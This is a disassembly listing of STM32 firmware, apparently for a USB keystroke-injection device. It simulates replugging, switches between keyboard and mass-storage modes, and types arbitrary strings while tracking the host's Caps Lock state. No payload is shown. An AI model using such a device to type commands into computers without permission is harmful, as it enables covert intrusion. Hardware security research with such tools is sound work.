 8000630:	463b      	mov	r3, r7
 8000632:	2200      	movs	r2, #0
 8000634:	601a      	str	r2, [r3, #0]
 8000636:	605a      	str	r2, [r3, #4]
 8000638:	609a      	str	r2, [r3, #8]
 800063a:	60da      	str	r2, [r3, #12]
 800063c:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 800063e:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000642:	f003 f8cf 	bl	80037e4 <HAL_PWREx_ControlVoltageScaling>
 8000646:	4603      	mov	r3, r0
 8000648:	2b00      	cmp	r3, #0
 800064a:	d001      	beq.n	8000650 <SystemClock_Config+0x34>
  {
    Error_Handler();
 800064c:	f000 fb14 	bl	8000c78 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000650:	f003 f8aa 	bl	80037a8 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000654:	4b21      	ldr	r3, [pc, #132]	; (80006dc <SystemClock_Config+0xc0>)
 8000656:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800065a:	4a20      	ldr	r2, [pc, #128]	; (80006dc <SystemClock_Config+0xc0>)
 800065c:	f023 0318 	bic.w	r3, r3, #24
 8000660:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000664:	2314      	movs	r3, #20
 8000666:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000668:	2301      	movs	r3, #1
 800066a:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 800066c:	2301      	movs	r3, #1
 800066e:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000670:	2300      	movs	r3, #0
 8000672:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000674:	2360      	movs	r3, #96	; 0x60
 8000676:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 8000678:	2302      	movs	r3, #2
 800067a:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 800067c:	2301      	movs	r3, #1
 800067e:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 8000680:	2301      	movs	r3, #1
 8000682:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 8000684:	2318      	movs	r3, #24
 8000686:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 8000688:	2307      	movs	r3, #7
 800068a:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 800068c:	2302      	movs	r3, #2
 800068e:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 8000690:	2302      	movs	r3, #2
 8000692:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8000694:	f107 0314 	add.w	r3, r7, #20
 8000698:	4618      	mov	r0, r3
 800069a:	f003 f909 	bl	80038b0 <HAL_RCC_OscConfig>
 800069e:	4603      	mov	r3, r0
 80006a0:	2b00      	cmp	r3, #0
 80006a2:	d001      	beq.n	80006a8 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 80006a4:	f000 fae8 	bl	8000c78 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 80006a8:	230f      	movs	r3, #15
 80006aa:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 80006ac:	2303      	movs	r3, #3
 80006ae:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 80006b0:	2300      	movs	r3, #0
 80006b2:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 80006b4:	2300      	movs	r3, #0
 80006b6:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 80006b8:	2300      	movs	r3, #0
 80006ba:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 80006bc:	463b      	mov	r3, r7
 80006be:	2102      	movs	r1, #2
 80006c0:	4618      	mov	r0, r3
 80006c2:	f003 fd09 	bl	80040d8 <HAL_RCC_ClockConfig>
 80006c6:	4603      	mov	r3, r0
 80006c8:	2b00      	cmp	r3, #0
 80006ca:	d001      	beq.n	80006d0 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 80006cc:	f000 fad4 	bl	8000c78 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 80006d0:	f004 f91c 	bl	800490c <HAL_RCCEx_EnableMSIPLLMode>
}
 80006d4:	bf00      	nop
 80006d6:	3758      	adds	r7, #88	; 0x58
 80006d8:	46bd      	mov	sp, r7
 80006da:	bd80      	pop	{r7, pc}
 80006dc:	40021000 	.word	0x40021000

080006e0 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 80006e0:	b580      	push	{r7, lr}
 80006e2:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 80006e4:	2200      	movs	r2, #0
 80006e6:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006ea:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006ee:	f001 fa7f 	bl	8001bf0 <HAL_GPIO_WritePin>
}
 80006f2:	bf00      	nop
 80006f4:	bd80      	pop	{r7, pc}

080006f6 <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 80006f6:	b580      	push	{r7, lr}
 80006f8:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 80006fa:	2201      	movs	r2, #1
 80006fc:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000700:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000704:	f001 fa74 	bl	8001bf0 <HAL_GPIO_WritePin>
}
 8000708:	bf00      	nop
 800070a:	bd80      	pop	{r7, pc}

0800070c <SwitchToHID>:

void SwitchToHID(){
 800070c:	b580      	push	{r7, lr}
 800070e:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000710:	f7ff ffe6 	bl	80006e0 <SimulateUSB_unplug>
	isMSC = 0;
 8000714:	4b06      	ldr	r3, [pc, #24]	; (8000730 <SwitchToHID+0x24>)
 8000716:	2200      	movs	r2, #0
 8000718:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 800071a:	2032      	movs	r0, #50	; 0x32
 800071c:	f000 fd50 	bl	80011c0 <HAL_Delay>
	SimulateUSB_plugin();
 8000720:	f7ff ffe9 	bl	80006f6 <SimulateUSB_plugin>
	MX_TIM2_Init();
 8000724:	f000 fba2 	bl	8000e6c <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000728:	f00b fe1c 	bl	800c364 <MX_USB_DEVICE_Init>
}
 800072c:	bf00      	nop
 800072e:	bd80      	pop	{r7, pc}
 8000730:	20000978 	.word	0x20000978

08000734 <SwitchToMSC>:

void SwitchToMSC(){
 8000734:	b580      	push	{r7, lr}
 8000736:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000738:	f7ff ffd2 	bl	80006e0 <SimulateUSB_unplug>
	isMSC = 1;
 800073c:	4b07      	ldr	r3, [pc, #28]	; (800075c <SwitchToMSC+0x28>)
 800073e:	2201      	movs	r2, #1
 8000740:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000742:	2032      	movs	r0, #50	; 0x32
 8000744:	f000 fd3c 	bl	80011c0 <HAL_Delay>
	SimulateUSB_plugin();
 8000748:	f7ff ffd5 	bl	80006f6 <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 800074c:	f00b fe3a 	bl	800c3c4 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(PlugSlot*10);
 8000750:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000754:	f000 fd34 	bl	80011c0 <HAL_Delay>
}
 8000758:	bf00      	nop
 800075a:	bd80      	pop	{r7, pc}
 800075c:	20000978 	.word	0x20000978

08000760 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000760:	b580      	push	{r7, lr}
 8000762:	b0a4      	sub	sp, #144	; 0x90
 8000764:	af00      	add	r7, sp, #0
 8000766:	4603      	mov	r3, r0
 8000768:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800076a:	220f      	movs	r2, #15
 800076c:	2100      	movs	r1, #0
 800076e:	4821      	ldr	r0, [pc, #132]	; (80007f4 <Get_Single_Descriptor+0x94>)
 8000770:	f00c fc30 	bl	800cfd4 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000774:	4a20      	ldr	r2, [pc, #128]	; (80007f8 <Get_Single_Descriptor+0x98>)
 8000776:	f107 0308 	add.w	r3, r7, #8
 800077a:	4611      	mov	r1, r2
 800077c:	2285      	movs	r2, #133	; 0x85
 800077e:	4618      	mov	r0, r3
 8000780:	f00c fc54 	bl	800d02c <memcpy>
	Convert2CapsMap(Map);
 8000784:	f107 0308 	add.w	r3, r7, #8
 8000788:	4618      	mov	r0, r3
 800078a:	f000 f93f 	bl	8000a0c <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 800078e:	79fb      	ldrb	r3, [r7, #7]
 8000790:	3390      	adds	r3, #144	; 0x90
 8000792:	443b      	add	r3, r7
 8000794:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 8000798:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 800079c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007a0:	091b      	lsrs	r3, r3, #4
 80007a2:	b2db      	uxtb	r3, r3
 80007a4:	461a      	mov	r2, r3
 80007a6:	4b13      	ldr	r3, [pc, #76]	; (80007f4 <Get_Single_Descriptor+0x94>)
 80007a8:	5c9b      	ldrb	r3, [r3, r2]
 80007aa:	b25a      	sxtb	r2, r3
 80007ac:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007b0:	f003 0307 	and.w	r3, r3, #7
 80007b4:	2101      	movs	r1, #1
 80007b6:	fa01 f303 	lsl.w	r3, r1, r3
 80007ba:	b25b      	sxtb	r3, r3
 80007bc:	4313      	orrs	r3, r2
 80007be:	b259      	sxtb	r1, r3
 80007c0:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007c4:	091b      	lsrs	r3, r3, #4
 80007c6:	b2db      	uxtb	r3, r3
 80007c8:	461a      	mov	r2, r3
 80007ca:	b2c9      	uxtb	r1, r1
 80007cc:	4b09      	ldr	r3, [pc, #36]	; (80007f4 <Get_Single_Descriptor+0x94>)
 80007ce:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 80007d0:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007d4:	f003 0308 	and.w	r3, r3, #8
 80007d8:	2b00      	cmp	r3, #0
 80007da:	d006      	beq.n	80007ea <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 80007dc:	4b05      	ldr	r3, [pc, #20]	; (80007f4 <Get_Single_Descriptor+0x94>)
 80007de:	781b      	ldrb	r3, [r3, #0]
 80007e0:	f043 0302 	orr.w	r3, r3, #2
 80007e4:	b2da      	uxtb	r2, r3
 80007e6:	4b03      	ldr	r3, [pc, #12]	; (80007f4 <Get_Single_Descriptor+0x94>)
 80007e8:	701a      	strb	r2, [r3, #0]
}
 80007ea:	bf00      	nop
 80007ec:	3790      	adds	r7, #144	; 0x90
 80007ee:	46bd      	mov	sp, r7
 80007f0:	bd80      	pop	{r7, pc}
 80007f2:	bf00      	nop
 80007f4:	2000025c 	.word	0x2000025c
 80007f8:	0800d060 	.word	0x0800d060

080007fc <Get_Multi_Descriptor>:

void Get_Multi_Descriptor(uint8_t *array, int num){
 80007fc:	b580      	push	{r7, lr}
 80007fe:	b0a6      	sub	sp, #152	; 0x98
 8000800:	af00      	add	r7, sp, #0
 8000802:	6078      	str	r0, [r7, #4]
 8000804:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000806:	220f      	movs	r2, #15
 8000808:	2100      	movs	r1, #0
 800080a:	482a      	ldr	r0, [pc, #168]	; (80008b4 <Get_Multi_Descriptor+0xb8>)
 800080c:	f00c fbe2 	bl	800cfd4 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000810:	4a29      	ldr	r2, [pc, #164]	; (80008b8 <Get_Multi_Descriptor+0xbc>)
 8000812:	f107 030c 	add.w	r3, r7, #12
 8000816:	4611      	mov	r1, r2
 8000818:	2285      	movs	r2, #133	; 0x85
 800081a:	4618      	mov	r0, r3
 800081c:	f00c fc06 	bl	800d02c <memcpy>
	Convert2CapsMap(Map);
 8000820:	f107 030c 	add.w	r3, r7, #12
 8000824:	4618      	mov	r0, r3
 8000826:	f000 f8f1 	bl	8000a0c <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 800082a:	2300      	movs	r3, #0
 800082c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000830:	e036      	b.n	80008a0 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 8000832:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000836:	687a      	ldr	r2, [r7, #4]
 8000838:	4413      	add	r3, r2
 800083a:	781b      	ldrb	r3, [r3, #0]
 800083c:	3398      	adds	r3, #152	; 0x98
 800083e:	443b      	add	r3, r7
 8000840:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000844:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000848:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800084c:	091b      	lsrs	r3, r3, #4
 800084e:	b2db      	uxtb	r3, r3
 8000850:	461a      	mov	r2, r3
 8000852:	4b18      	ldr	r3, [pc, #96]	; (80008b4 <Get_Multi_Descriptor+0xb8>)
 8000854:	5c9b      	ldrb	r3, [r3, r2]
 8000856:	b25a      	sxtb	r2, r3
 8000858:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800085c:	f003 0307 	and.w	r3, r3, #7
 8000860:	2101      	movs	r1, #1
 8000862:	fa01 f303 	lsl.w	r3, r1, r3
 8000866:	b25b      	sxtb	r3, r3
 8000868:	4313      	orrs	r3, r2
 800086a:	b259      	sxtb	r1, r3
 800086c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000870:	091b      	lsrs	r3, r3, #4
 8000872:	b2db      	uxtb	r3, r3
 8000874:	461a      	mov	r2, r3
 8000876:	b2c9      	uxtb	r1, r1
 8000878:	4b0e      	ldr	r3, [pc, #56]	; (80008b4 <Get_Multi_Descriptor+0xb8>)
 800087a:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 800087c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000880:	f003 0308 	and.w	r3, r3, #8
 8000884:	2b00      	cmp	r3, #0
 8000886:	d006      	beq.n	8000896 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 8000888:	4b0a      	ldr	r3, [pc, #40]	; (80008b4 <Get_Multi_Descriptor+0xb8>)
 800088a:	781b      	ldrb	r3, [r3, #0]
 800088c:	f043 0302 	orr.w	r3, r3, #2
 8000890:	b2da      	uxtb	r2, r3
 8000892:	4b08      	ldr	r3, [pc, #32]	; (80008b4 <Get_Multi_Descriptor+0xb8>)
 8000894:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 8000896:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800089a:	3301      	adds	r3, #1
 800089c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80008a0:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 80008a4:	683b      	ldr	r3, [r7, #0]
 80008a6:	429a      	cmp	r2, r3
 80008a8:	dbc3      	blt.n	8000832 <Get_Multi_Descriptor+0x36>
	}
}
 80008aa:	bf00      	nop
 80008ac:	bf00      	nop
 80008ae:	3798      	adds	r7, #152	; 0x98
 80008b0:	46bd      	mov	sp, r7
 80008b2:	bd80      	pop	{r7, pc}
 80008b4:	2000025c 	.word	0x2000025c
 80008b8:	0800d060 	.word	0x0800d060

080008bc <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008bc:	b580      	push	{r7, lr}
 80008be:	b082      	sub	sp, #8
 80008c0:	af00      	add	r7, sp, #0
 80008c2:	4603      	mov	r3, r0
 80008c4:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 80008c6:	79fb      	ldrb	r3, [r7, #7]
 80008c8:	4618      	mov	r0, r3
 80008ca:	f7ff ff49 	bl	8000760 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008ce:	220f      	movs	r2, #15
 80008d0:	4903      	ldr	r1, [pc, #12]	; (80008e0 <SimulateKeyPress+0x24>)
 80008d2:	4804      	ldr	r0, [pc, #16]	; (80008e4 <SimulateKeyPress+0x28>)
 80008d4:	f008 f884 	bl	80089e0 <USBD_CUSTOM_HID_SendReport>
}
 80008d8:	bf00      	nop
 80008da:	3708      	adds	r7, #8
 80008dc:	46bd      	mov	sp, r7
 80008de:	bd80      	pop	{r7, pc}
 80008e0:	2000025c 	.word	0x2000025c
 80008e4:	200003c0 	.word	0x200003c0

080008e8 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 80008e8:	b580      	push	{r7, lr}
 80008ea:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008ec:	220f      	movs	r2, #15
 80008ee:	2100      	movs	r1, #0
 80008f0:	4804      	ldr	r0, [pc, #16]	; (8000904 <SimulateKeyRelease+0x1c>)
 80008f2:	f00c fb6f 	bl	800cfd4 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008f6:	220f      	movs	r2, #15
 80008f8:	4902      	ldr	r1, [pc, #8]	; (8000904 <SimulateKeyRelease+0x1c>)
 80008fa:	4803      	ldr	r0, [pc, #12]	; (8000908 <SimulateKeyRelease+0x20>)
 80008fc:	f008 f870 	bl	80089e0 <USBD_CUSTOM_HID_SendReport>
}
 8000900:	bf00      	nop
 8000902:	bd80      	pop	{r7, pc}
 8000904:	2000025c 	.word	0x2000025c
 8000908:	200003c0 	.word	0x200003c0

0800090c <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 800090c:	b580      	push	{r7, lr}
 800090e:	b082      	sub	sp, #8
 8000910:	af00      	add	r7, sp, #0
 8000912:	4603      	mov	r3, r0
 8000914:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 8000916:	79fb      	ldrb	r3, [r7, #7]
 8000918:	4618      	mov	r0, r3
 800091a:	f7ff ffcf 	bl	80008bc <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 800091e:	2023      	movs	r0, #35	; 0x23
 8000920:	f000 fc4e 	bl	80011c0 <HAL_Delay>
	SimulateKeyRelease();
 8000924:	f7ff ffe0 	bl	80008e8 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000928:	2023      	movs	r0, #35	; 0x23
 800092a:	f000 fc49 	bl	80011c0 <HAL_Delay>
}
 800092e:	bf00      	nop
 8000930:	3708      	adds	r7, #8
 8000932:	46bd      	mov	sp, r7
 8000934:	bd80      	pop	{r7, pc}
	...

08000938 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000938:	b580      	push	{r7, lr}
 800093a:	b082      	sub	sp, #8
 800093c:	af00      	add	r7, sp, #0
 800093e:	6078      	str	r0, [r7, #4]
 8000940:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 8000942:	6839      	ldr	r1, [r7, #0]
 8000944:	6878      	ldr	r0, [r7, #4]
 8000946:	f7ff ff59 	bl	80007fc <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 800094a:	e002      	b.n	8000952 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 800094c:	2080      	movs	r0, #128	; 0x80
 800094e:	f7ff ffdd 	bl	800090c <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000952:	4b0c      	ldr	r3, [pc, #48]	; (8000984 <SimulateShortcutKey+0x4c>)
 8000954:	781b      	ldrb	r3, [r3, #0]
 8000956:	f003 0302 	and.w	r3, r3, #2
 800095a:	2b00      	cmp	r3, #0
 800095c:	d0f6      	beq.n	800094c <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800095e:	220f      	movs	r2, #15
 8000960:	4909      	ldr	r1, [pc, #36]	; (8000988 <SimulateShortcutKey+0x50>)
 8000962:	480a      	ldr	r0, [pc, #40]	; (800098c <SimulateShortcutKey+0x54>)
 8000964:	f008 f83c 	bl	80089e0 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000968:	2023      	movs	r0, #35	; 0x23
 800096a:	f000 fc29 	bl	80011c0 <HAL_Delay>
	SimulateKeyRelease();
 800096e:	f7ff ffbb 	bl	80008e8 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 8000972:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000976:	f000 fc23 	bl	80011c0 <HAL_Delay>
}
 800097a:	bf00      	nop
 800097c:	3708      	adds	r7, #8
 800097e:	46bd      	mov	sp, r7
 8000980:	bd80      	pop	{r7, pc}
 8000982:	bf00      	nop
 8000984:	2000026c 	.word	0x2000026c
 8000988:	2000025c 	.word	0x2000025c
 800098c:	200003c0 	.word	0x200003c0

08000990 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 8000990:	b580      	push	{r7, lr}
 8000992:	b084      	sub	sp, #16
 8000994:	af00      	add	r7, sp, #0
 8000996:	60f8      	str	r0, [r7, #12]
 8000998:	60b9      	str	r1, [r7, #8]
 800099a:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 800099c:	687b      	ldr	r3, [r7, #4]
 800099e:	2200      	movs	r2, #0
 80009a0:	601a      	str	r2, [r3, #0]
 80009a2:	e025      	b.n	80009f0 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 80009a4:	4b17      	ldr	r3, [pc, #92]	; (8000a04 <SimulateKeyStrokes+0x74>)
 80009a6:	781b      	ldrb	r3, [r3, #0]
 80009a8:	f003 0302 	and.w	r3, r3, #2
 80009ac:	2b00      	cmp	r3, #0
 80009ae:	d102      	bne.n	80009b6 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 80009b0:	2080      	movs	r0, #128	; 0x80
 80009b2:	f7ff ffab 	bl	800090c <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 80009b6:	687b      	ldr	r3, [r7, #4]
 80009b8:	681b      	ldr	r3, [r3, #0]
 80009ba:	461a      	mov	r2, r3
 80009bc:	68fb      	ldr	r3, [r7, #12]
 80009be:	4413      	add	r3, r2
 80009c0:	781b      	ldrb	r3, [r3, #0]
 80009c2:	4618      	mov	r0, r3
 80009c4:	f7ff ffa2 	bl	800090c <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 80009c8:	4b0f      	ldr	r3, [pc, #60]	; (8000a08 <SimulateKeyStrokes+0x78>)
 80009ca:	681b      	ldr	r3, [r3, #0]
 80009cc:	2b01      	cmp	r3, #1
 80009ce:	d10a      	bne.n	80009e6 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 80009d0:	4b0d      	ldr	r3, [pc, #52]	; (8000a08 <SimulateKeyStrokes+0x78>)
 80009d2:	2200      	movs	r2, #0
 80009d4:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 80009d6:	687b      	ldr	r3, [r7, #4]
 80009d8:	681b      	ldr	r3, [r3, #0]
 80009da:	1e5a      	subs	r2, r3, #1
 80009dc:	687b      	ldr	r3, [r7, #4]
 80009de:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 80009e0:	2081      	movs	r0, #129	; 0x81
 80009e2:	f7ff ff93 	bl	800090c <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009e6:	687b      	ldr	r3, [r7, #4]
 80009e8:	681b      	ldr	r3, [r3, #0]
 80009ea:	1c5a      	adds	r2, r3, #1
 80009ec:	687b      	ldr	r3, [r7, #4]
 80009ee:	601a      	str	r2, [r3, #0]
 80009f0:	687b      	ldr	r3, [r7, #4]
 80009f2:	681b      	ldr	r3, [r3, #0]
 80009f4:	68ba      	ldr	r2, [r7, #8]
 80009f6:	429a      	cmp	r2, r3
 80009f8:	dcd4      	bgt.n	80009a4 <SimulateKeyStrokes+0x14>
		}
	}
}
 80009fa:	bf00      	nop
 80009fc:	bf00      	nop
 80009fe:	3710      	adds	r7, #16
 8000a00:	46bd      	mov	sp, r7
 8000a02:	bd80      	pop	{r7, pc}
 8000a04:	2000026c 	.word	0x2000026c
 8000a08:	2000027c 	.word	0x2000027c

08000a0c <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 8000a0c:	b480      	push	{r7}
 8000a0e:	b085      	sub	sp, #20
 8000a10:	af00      	add	r7, sp, #0
 8000a12:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a14:	2341      	movs	r3, #65	; 0x41
 8000a16:	73fb      	strb	r3, [r7, #15]
 8000a18:	e01a      	b.n	8000a50 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 8000a1a:	7bfb      	ldrb	r3, [r7, #15]
 8000a1c:	687a      	ldr	r2, [r7, #4]
 8000a1e:	4413      	add	r3, r2
 8000a20:	781a      	ldrb	r2, [r3, #0]
 8000a22:	7bfb      	ldrb	r3, [r7, #15]
 8000a24:	6879      	ldr	r1, [r7, #4]
 8000a26:	440b      	add	r3, r1
 8000a28:	f022 0208 	bic.w	r2, r2, #8
 8000a2c:	b2d2      	uxtb	r2, r2
 8000a2e:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a30:	7bfb      	ldrb	r3, [r7, #15]
 8000a32:	3320      	adds	r3, #32
 8000a34:	687a      	ldr	r2, [r7, #4]
 8000a36:	4413      	add	r3, r2
 8000a38:	781a      	ldrb	r2, [r3, #0]
 8000a3a:	7bfb      	ldrb	r3, [r7, #15]
 8000a3c:	3320      	adds	r3, #32
 8000a3e:	6879      	ldr	r1, [r7, #4]
 8000a40:	440b      	add	r3, r1
 8000a42:	f042 0208 	orr.w	r2, r2, #8
 8000a46:	b2d2      	uxtb	r2, r2
 8000a48:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a4a:	7bfb      	ldrb	r3, [r7, #15]
 8000a4c:	3301      	adds	r3, #1
 8000a4e:	73fb      	strb	r3, [r7, #15]
 8000a50:	7bfb      	ldrb	r3, [r7, #15]
 8000a52:	2b5a      	cmp	r3, #90	; 0x5a
 8000a54:	d9e1      	bls.n	8000a1a <Convert2CapsMap+0xe>
	}
}
 8000a56:	bf00      	nop
 8000a58:	bf00      	nop
 8000a5a:	3714      	adds	r7, #20
 8000a5c:	46bd      	mov	sp, r7
 8000a5e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a62:	4770      	bx	lr

